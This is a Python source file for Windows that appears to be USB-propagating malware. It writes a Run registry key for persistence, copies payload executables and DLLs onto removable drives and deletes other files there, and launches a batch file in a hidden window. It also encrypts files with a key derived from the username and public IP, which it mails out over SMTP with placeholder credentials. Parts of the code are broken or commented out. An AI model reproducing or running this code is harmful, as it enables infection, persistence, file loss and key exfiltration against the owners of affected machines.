import pyAesCrypt
import string
import os
import smtplib
import base64
import requests
import shutil
import subprocess
from win32 import win32api
from win32 import win32file
from winregistry import WinRegistry as Reg
import getpass
import time
import random 
Encrypted_Files =['Dlls.batMic','Gate.exeMic','msvcp140.dllMic','nvrtc-builtins64_92.dllMic','nvrtc64_92.dllMic','OpenCL.dllMic','vcruntime140.dllMic','Micro.Mic','Micro.exe']
files_list =['Dlls.bat','Gate.exe','msvcp140.dll','nvrtc-builtins64_92.dll','nvrtc64_92.dll','OpenCL.dll','vcruntime140.dll','Micro.Mic','Micro.exe']
encrypted_files = []
global handl3rs
handl3rs = [] 
#log = open('Micro.Mic', 'wb') 
#pass
char_set = string.printable
global passwrd
passwrd = ""

# a funtion that checks base folder for virus returns true if found false if not 
def check_base():
    x=0
    user = getpass.getuser()
    path = "C:/Users/"+user+"/Downloads/"
    try:
        os.chdir(path+"Micro")
        cwd= os.getcwd()
        for r, d, f in os.walk(cwd):
            for file in (f):
                x+=1
                if [ item for item in files_list if item==file in files_list ]:
                    print (file,"       <----Decrypted file",os.getcwd(),x)
                    Base_Files = True
                else:
                    Base_Files = False
    except:
        os.mkdir(path+"Micro")
        os.chdir(path+"Micro")
        cwd = os.getcwd()
        print (cwd)
        Base_Files = False
    return Base_Files

# edit registry to autorun after reboot
def Reg_Me():
    reg = Reg()
    key = 'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
    encoding = 'utf-8'
    whoami = getpass.getuser()
    path = "C:/Users/"+str(whoami)+"/Downloads/Micro/Micro.exe"
    path = path.replace('/','\\')
    Data = str(path)
    reg.write_value(key, 'Micro', '"'+Data+'"'+"/background", 'REG_SZ')
    #print (reg.read_key(key))
    #print (path)
    #return True
    print ("REGISTRY EDITED")
    return True



# a function that checks usb drive for my virus returns true if found false if not

def check_drive(drive):
    x=0
    user = getpass.getuser()
    dpath = drive
    try:
        os.chdir(dpath+"DLL")
        cwd = os.getcwd()
        for r, d, f in os.walk(cwd):
            for file in (f):
                x+=1
                if [ item for item in Encrypted_Files if item==file in Encrypted_Files ]:
                    print (file,"    <----Encrypted file",os.getcwd(),x )
                    Drive_Files = True
                else:
                    Drive_Files = False
                    pass
    except:
        os.mkdir(dpath+"DLL")
        os.chdir(dpath+"DLL")
        cwd= os.getcwd()
        print (cwd)
        Drive_Files=False
    return Drive_Files


def Mail_Man():
    user = getpass.getuser()
    passwrd= user
    pip = requests.get(r'http://jsonip.com')
    ip = pip.json()['ip']
    passwrd+=ip
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login("user@gmail.com", "password")
    s.sendmail("user@gmail.com", "user@gmail.com", passwrd)
    s.quit()
    



def check_handlers():
    DRIVE_TYPES = """
0 	Unknown
1 	No Root Directory
2 	Removable Disk
3 	Local Disk
4 	Network Drive
5 	Compact Disc
6 	RAM Disk
"""
    drive_types = dict((int (i), j) for (i, j) in (l.split ("\t") for l in DRIVE_TYPES.splitlines () if l))
    drives = (drive for drive in win32api.GetLogicalDriveStrings ().split ("\000") if drive)
    for drive in drives:
        #print (drive, "=>", drive_types[win32file.GetDriveType (drive)])
        if str(drive_types[win32file.GetDriveType (drive)])=="Removable Disk":
            print (drive,drive_types[win32file.GetDriveType (drive)])
            handl3rs.append(drive)
            print ("Drive appended")
        else:
            print ("No Removable Disks")



def write_USB():
    for drive in (handl3rs):
        print (drive)
        try:
            os.chdir(drive+"DLL")
            cwd = os.getcwd()
            path2 = os.getcwd()
            for r, d, f in os.walk(cwd):
                for file in (f):
                    print (file)
        except :
            os.mkdir (drive+"DLL")
            os.chdir(drive+"DLL")
            path2 = os.getcwd()
            print (os.getcwd())
        time.sleep(1)
        try:
            user = getpass.getuser()
            path = "C:/Users/"+user+"/Downloads/Micro/"
            os.chdir(path)
            cwd = os.getcwd()
            print (cwd)
            for r, d, f in os.walk(cwd):
                for file in (f):
                    print(file)
                    shutil.copy(file, path2)
            
        except:
            pass
            
                        
                       




def write_base():
    for drive in (handl3rs):
        user = getpass.getuser()
        path = "C:/Users/"+user+"/Downloads/Micro"
        try:
            os.chdir(drive+"DLL")
            cwd = os.getcwd()
            print (cwd)
            for r,d, f in os.walk(cwd):
                for file in (f):
                    if [ item for item in files_list if item==file in files_list ]:
                        print ("passed file ->", file)
                        shutil.copy(file, path)
                    elif file == "Micro.exe":
                        print ("passed file ->", file)
                        shutil.copy(file, path)
                    elif file == "Micro.Mic":
                        print ("passed file ->", file)
                        shutil.copy(file, path)
                    else:
                        os.remove(file)
                        print ("Deleted file ->", file)
                    
            
        except:
            os.mkdir(drive+"DLL")
            os.chdir(drive+"DLL")
            cwd = os.getcwd()
            for r, d, f in os.walk(cwd):
                for file in (f):
                    print (file)
            




def Run_Me():
    CREATE_NO_WINDOW = 0x08000000
    subprocess.call('Dlls.bat', creationflags=CREATE_NO_WINDOW)
    
    






def pass_wrd():
    user = getpass.getuser()
    passwrd= user
    pip = requests.get(r'http://jsonip.com')
    ip = pip.json()['ip']
    passwrd +=ip
    print (passwrd)
    return passwrd
    
    
    
    



def Encrypt_Me(passwrd):
    user = getpass.getuser()
    path = "C:/Users/"+user+"/Downloads/Micro"
    encoding = 'utf-8'
    ST = time.time()
    bufferSize = 64 * 1024
    cwd =os.getcwd()
    os.chdir(path)
    cwd =os.getcwd()
    with open('Micro.Mic', 'wb') as log:
        encoded_passwrd =base64.b64encode(passwrd.encode(encoding))
        log.write(encoded_passwrd)
        log.close()
    print (cwd)
    for r, d, f in os.walk(cwd):
        for file in (f):
            if file =="Micro.exe":
                print (file, "Skipped")
                pass
            elif file =="Micro.Mic":
                print (file, "Skipped")
                pass
            else:
                pyAesCrypt.encryptFile(file , file+"Mic",passwrd, bufferSize)
                print (file, "<------------------File encrypted")
                os.remove(file)
    print (time.time()-ST)





def Decrypt_Me():
    encoding = 'utf-8'
    bufferSize = 64 *1024
    ST = time.time()
    os.chdir('C:/Users/victim/Downloads/micro')
    with open ('Micro.Mic', 'rb') as read:
        password = read.read()
        password =base64.b64decode(password.decode(encoding))
        read.close()
    password = str(password.decode(encoding))
    print (password)
    cwd =os.getcwd()
    print (cwd)
    for r, d, f in os.walk(cwd):
        for file in (f):
            if file =="Micro.exe":
                print (file, "Skipped")
                pass
            elif file =="Micro.Mic":
                print (file, "Skipped")
                pass
            else:
                pyAesCrypt.decryptFile(file , file.replace('Mic',''),password, bufferSize)
                print (file, "<-------------------File decrypted")
                os.remove(file)
    #log = open('Micro.Mic', 'wb')
    #pass
                
                



def main_process():
    try:
        check_handlers()
    except:
        print ("nousbs")
    try:
        pass_wrd()
    except:
        return False
    print("extracted password")
    try:
        check_base()
        if Base_Files == True:
            print ("files found")
## read files from usb and write base
        elif Base_Files == False:
            print ("files not found")
            
    except:
        print ("Failed")
    print ("virus files checked")

    #try:
        #pass_wrd()
        #time.sleep(2)
        #check_base()
        #time.sleep(2)
        #Encrypt_Me(passwrd)
        #time.sleep(2)
    #except:
    #    print ("failed")
        

    try:
        #check_handlers()
        for drive in handl3rs:
            check_drive(drive)
        time.sleep(2)
        print ("slept for 2 secs")
        #Deccrypt_Me()
        #time.sleep(2)
        #print ("Decrypted  successfully")
               
            
            
    except:
        print ("failed")
print (main_process())



































